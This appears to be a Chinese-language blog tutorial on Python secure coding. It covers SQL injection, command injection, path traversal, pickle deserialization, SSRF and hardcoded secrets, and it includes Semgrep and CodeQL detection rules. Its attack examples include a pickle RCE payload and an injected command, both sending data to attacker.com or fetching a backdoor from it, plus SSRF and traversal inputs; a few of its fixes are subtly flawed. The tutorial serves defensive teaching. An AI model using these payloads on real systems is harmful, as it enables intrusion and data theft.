---
layout: post
title: "Python 安全编码实战：常见漏洞与防护方案"
date: 2026-08-11 18:00:00 +0800
categories: [安全开发]
tags: [python, security, secure-coding, sql-injection, sast, code-review]
---

## 1. 为什么需要安全编码

OWASP 数据显示，超过 70% 的安全漏洞源自代码层面的缺陷。安全测试和渗透测试只能发现已有漏洞，但真正降低风险的方式是——**在写代码的时候就避免引入漏洞**。

安全编码不是"额外工作"，而是开发者基本功。本文聚焦 Python 生态中最常见的六类安全漏洞，每类都给出**漏洞代码 → 攻击向量 → 修复方案**的完整链条，并附带自动化检测方法。

## 2. SQL 注入

### 漏洞代码

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect("users.db")
    # 危险的：直接拼接 SQL
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor = conn.execute(query)
    return cursor.fetchone()
```

### 攻击

```python
# 输入: admin' OR '1'='1
# 实际执行的 SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# 返回所有用户数据

# 输入: admin'; DROP TABLE users; --
# 最坏情况：删库
```

### 参数化查询（修复）

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect("users.db")
    # 安全的：参数化查询
    query = "SELECT * FROM users WHERE username = ?"
    cursor = conn.execute(query, (username,))
    return cursor.fetchone()
```

### SQLAlchemy ORM

```python
from sqlalchemy import text

# 危险：使用 text() 时拼接
query = text(f"SELECT * FROM users WHERE username = '{username}'")

# 安全：使用绑定参数
query = text("SELECT * FROM users WHERE username = :username")
result = session.execute(query, {"username": username})
```

**规则**：永远不要用 `f-string`、`+` 或 `format()` 拼接 SQL 语句。无论用原生驱动还是 ORM，都使用参数化接口。

## 3. 命令注入

### 漏洞代码

```python
import os

def ping_host(host):
    # 危险的：直接传给 shell
    os.system(f"ping -c 4 {host}")
```

### 攻击

```python
# 输入: 127.0.0.1; cat /etc/passwd
# 实际执行: ping -c 4 127.0.0.1; cat /etc/passwd
# 攻击者读取了系统文件

# 输入: 127.0.0.1 | curl http://attacker.com/exfil?data=$(cat /etc/shadow)
# 远程数据外泄
```

### 修复方案

```python
import subprocess
import shlex

def ping_host(host):
    # 方案一：使用列表参数，避免 shell 解析
    # ！！！注意：这仍然不安全，因为 host 参数可能包含特殊字符
    # subprocess.run(["ping", "-c", "4", host], check=True)
    
    # 方案二：先做输入验证，再传参
    import re
    if not re.match(r'^[\w.-]+$', host):
        raise ValueError("Invalid host")
    subprocess.run(["ping", "-c", "4", host], check=True)


# 通用原则：永远不要用 shell=True 处理用户输入
def run_safe_command(user_input, *args):
    """安全的命令执行模板"""
    # 1. 白名单验证
    ALLOWED_COMMANDS = {"ls", "df", "whoami"}
    if user_input not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {user_input}")
    # 2. 使用列表传参
    subprocess.run([user_input, *args], shell=False, check=True)
```

### 特殊情况：不得已用 shell=True

```python
import shlex

def safe_shell_command(user_input):
    # shlex.quote 会转义 shell 特殊字符
    safe_input = shlex.quote(user_input)
    subprocess.run(f"grep '{safe_input}' /var/log/syslog", shell=True, check=True)
```

**规则**：首选 `shell=False` 和列表参数。必须用 `shell=True` 时，用 `shlex.quote()` 转义用户输入。最佳实践是白名单 + 输入验证。

## 4. 路径遍历

### 漏洞代码

```python
def read_file(filename):
    with open(f"/var/data/{filename}", "r") as f:
        return f.read()
```

### 攻击

```python
# 输入: ../../etc/passwd
# 实际路径: /var/data/../../etc/passwd → /etc/passwd
# 攻击者读取了系统密码文件
```

### 修复方案

```python
import os

SAFE_BASE = "/var/data"

def read_file_safe(filename):
    # 1. 解析绝对路径
    requested_path = os.path.normpath(os.path.join(SAFE_BASE, filename))
    # 2. 验证路径是否在安全目录下
    if not requested_path.startswith(SAFE_BASE):
        raise PermissionError("Access denied")
    # 3. 额外验证：拒绝符号链接逃逸
    real_path = os.path.realpath(requested_path)
    if not real_path.startswith(os.path.realpath(SAFE_BASE)):
        raise PermissionError("Symlink escape detected")
    
    with open(real_path, "r") as f:
        return f.read()
```

### 使用 Pathlib（Python 3.6+）

```python
from pathlib import Path

SAFE_BASE = Path("/var/data").resolve()

def read_file_safe(filename):
    file_path = (SAFE_BASE / filename).resolve()
    # 验证路径是否以安全目录开头
    if SAFE_BASE not in file_path.parents and file_path != SAFE_BASE:
        raise PermissionError("Access denied")
    return file_path.read_text()
```

**规则**：规范化路径后验证前缀，同时检查 `resolve()` 后的真实路径。不要相信用户提供的文件名，拒绝 `..` 和符号链接逃逸。

## 5. 反序列化攻击

### 漏洞代码

```python
import pickle

def load_session(session_data):
    # 危险的：从不可信来源反序列化
    return pickle.loads(session_data)
```

### 攻击

```python
# 攻击者构造恶意 pickle 数据
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/backdoor | bash",))

malicious_payload = pickle.dumps(RCE())

# 当服务器调用 pickle.loads(malicious_payload) 时，会执行任意命令
```

### 修复方案

```python
import json
import hmac
import hashlib

# 方案一：不要反序列化不可信数据
# 使用 JSON 替代 pickle
def load_session_safe(session_data):
    return json.loads(session_data)

# 方案二：如果必须用 pickle，加签名验证
SECRET_KEY = "your-secret-key"  # 从环境变量读取，不要硬编码

def sign_data(data: bytes) -> str:
    return hmac.new(
        SECRET_KEY.encode(), data, hashlib.sha256
    ).hexdigest()

def verify_and_load(signed_data: bytes):
    # 假设格式: data + "." + signature
    data, signature = signed_data.rsplit(b".", 1)
    expected_sig = sign_data(data)
    if not hmac.compare_digest(signature.decode(), expected_sig):
        raise ValueError("Invalid signature")
    return pickle.loads(data)  # 现在安全了，因为数据已签名验证
```

### 其他序列化方案

```python
# PyYAML 也需要小心
import yaml

# 危险：默认 Loader 可以执行任意代码
# data = yaml.load(user_input)  # 不要这样做

# 安全：使用 SafeLoader
data = yaml.safe_load(user_input)

# 安全的序列化格式
# - JSON (json.dumps / json.loads)
# - MessagePack (msgpack.packb / msgpack.unpackb)
# - Protocol Buffers (protobuf)
# - 签名后的 / 有认证的 pickle
```

**规则**：不要 `pickle.loads()` 来自网络、用户输入或未签名来源的数据。优先用 JSON、MessagePack、Protobuf 等安全序列化格式。必须用 pickle 时，加 HMAC 签名验证。

## 6. SSRF（服务端请求伪造）

### 漏洞代码

```python
import requests

def fetch_url(url):
    # 危险的：直接请求用户提供的 URL
    response = requests.get(url, timeout=5)
    return response.text
```

### 攻击

```python
# 输入: http://169.254.169.254/latest/meta-data/  (AWS 元数据端点)
# 输入: http://localhost:9200/  (暴露 Elasticsearch)
# 输入: file:///etc/passwd  (读取本地文件)
# 输入: http://10.0.0.1:6379/  (内网 Redis)
```

### 修复方案

```python
import requests
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = {"api.github.com", "api.openai.com"}

def fetch_url_safe(url):
    parsed = urlparse(url)
    
    # 1. 协议白名单
    if parsed.scheme not in ("https",):
        raise ValueError("Only HTTPS is allowed")
    
    # 2. 域名白名单（严格模式）
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    
    # 3. 解析 IP 并阻止内网地址
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Internal IP not allowed")
    except ValueError:
        pass  # 域名，交给白名单检查
    
    # 4. 设置超时，防止慢速攻击
    response = requests.get(url, timeout=5)
    return response.text
```

### 更完善的 SSRF 防护

```python
import socket
import ipaddress

def resolve_and_check(hostname: str) -> bool:
    """DNS 解析后检查 IP 是否在内网"""
    try:
        addr = socket.getaddrinfo(hostname, 80)[0][4][0]
        ip = ipaddress.ip_address(addr)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
        # 额外：阻止 CGNAT 和保留地址段
        if ip.is_global is False:
            return False
        return True
    except socket.gaierror:
        return False
```

**规则**：始终做域名白名单或 IP 校验。DNS 解析后二次验证。禁止 file://、gopher://、dict:// 等非常见协议。设置超时和重定向限制。

## 7. 硬编码密钥

### 漏洞代码

```python
# 密钥直接写在代码里
API_KEY = "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
DB_PASSWORD = "password123"
SECRET_KEY = "supersecretkey"
```

### 完整暴露链

```
GitHub 提交 → 自动化爬虫扫描 → 密钥泄露 → 攻击者利用
```

### 修复方案

```python
import os
from dotenv import load_dotenv

load_dotenv()

# 从环境变量读取
API_KEY = os.environ.get("API_KEY")
DB_PASSWORD = os.environ.get("DB_PASSWORD")
SECRET_KEY = os.environ.get("SECRET_KEY")

if not all([API_KEY, DB_PASSWORD, SECRET_KEY]):
    raise RuntimeError("Missing required environment variables")
```

### 进阶：密钥管理工具

```python
# 使用 HashiCorp Vault
import hvac

client = hvac.Client(url=os.environ["VAULT_ADDR"])
client.token = os.environ["VAULT_TOKEN"]

# 动态读取密钥，支持轮转
secret = client.secrets.kv.v2.read_secret_version(
    path="api/production/keys"
)
API_KEY = secret["data"]["data"]["api_key"]
```

### 检测已泄露的密钥

```bash
# 使用 git-secrets 扫描 Git 历史
git secrets --scan-history

# 使用 truffleHog 扫描
trufflehog filesystem --directory . --json

# 使用 Gitleaks 扫描
gitleaks detect --source . --verbose
```

**规则**：不在代码中硬编码任何密钥。使用环境变量、Vault、AWS Secrets Manager 等密钥管理服务。在 CI 中集成密钥扫描工具。

## 8. 自动化检测：SAST 工具

### Semgrep 规则示例

```yaml
# semgrep_rules/python-secure-coding.yaml
rules:
  - id: sql-injection-format
    patterns:
      - pattern: f"SELECT ... FROM ... WHERE ... = '$...'"
    message: "SQL 注入风险：使用参数化查询替代 f-string 拼接"
    languages: [python]
    severity: ERROR

  - id: command-injection-shell
    patterns:
      - pattern: subprocess.run("...", shell=True, ...)
      - pattern: os.system("...")
    message: "命令注入风险：避免 shell=True，使用列表参数"
    languages: [python]
    severity: WARNING

  - id: pickle-unsafe
    patterns:
      - pattern: pickle.loads(...)
      - pattern: pickle.load(...)
    message: "反序列化风险：不要从不可信来源反序列化 pickle"
    languages: [python]
    severity: ERROR

  - id: hardcoded-secret
    patterns:
      - pattern: |
          $VAR = "..."
      - metavariable-regex:
          metavariable: $VAR
          regex: (API_KEY|SECRET|PASSWORD|TOKEN|SECRET_KEY)
    message: "硬编码密钥风险：使用环境变量存储密钥"
    languages: [python]
    severity: WARNING
```

### 运行检测

```bash
# 安装 Semgrep
pip install semgrep

# 扫描项目
semgrep --config semgrep_rules/python-secure-coding.yaml --error .

# 集成到 pre-commit
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/semgrep/pre-commit
    rev: v1.72.0
    hooks:
      - id: semgrep
        args: ["--config", "semgrep_rules/python-secure-coding.yaml", "--error"]
EOF
```

### CodeQL 示例

```bash
# 安装 CodeQL CLI
# 下载: https://github.com/github/codeql-cli-binaries/releases

# 创建数据库
codeql database create python-db --language=python --source-root=.

# 运行查询
codeql database analyze python-db \
  --format=sarif-latest \
  --output=results.sarif \
  --download \
  codeql/python-queries:Security
```

## 9. 安全编码 Checklist

| 类别 | 检查项 | 严重程度 |
|------|--------|----------|
| SQL | 是否使用参数化查询？ | 高危 |
| 命令执行 | 是否避免 shell=True？ | 高危 |
| 文件操作 | 路径是否经过规范化验证？ | 高危 |
| 反序列化 | 是否避免 pickle 反序列化不可信数据？ | 高危 |
| SSRF | 是否有域名白名单和 IP 校验？ | 中危 |
| 密钥管理 | 是否有硬编码密钥？ | 高危 |
| 输入验证 | 所有用户输入是否经过验证？ | 中危 |
| 日志 | 是否在日志中输出敏感信息？ | 中危 |
| 认证 | 认证逻辑是否在服务端完成？ | 高危 |
| CORS | 是否过于宽松？ | 中危 |

## 10. 总结

安全编码不是一朝一夕能掌握的，但遵循几条基本原则可以挡住 90% 的常见攻击：

1. **不要信任输入** — 每个用户输入都是潜在的攻击向量
2. **最小权限** — 程序只访问它需要的数据和资源
3. **纵深防御** — 同时使用输入验证、参数化查询、SAST 扫描等多层防护
4. **自动化扫描** — 将 Semgrep 或 CodeQL 集成到 CI 中，在代码合并前发现问题
5. **密钥不落地** — 代码里不出现任何密钥，密钥管理使用专门的工具

推荐在项目中加入 `.pre-commit-config.yaml`，在每次提交前自动运行安全扫描，把安全左移到开发阶段。

> **延伸阅读：** 本博客的 [DevSecOps 实战](/posts/devsecops-trivy-opa-ci-cd-pipeline/) 讲了如何在 CI 层面构建安全流水线，与本文的代码级安全编码互为补充。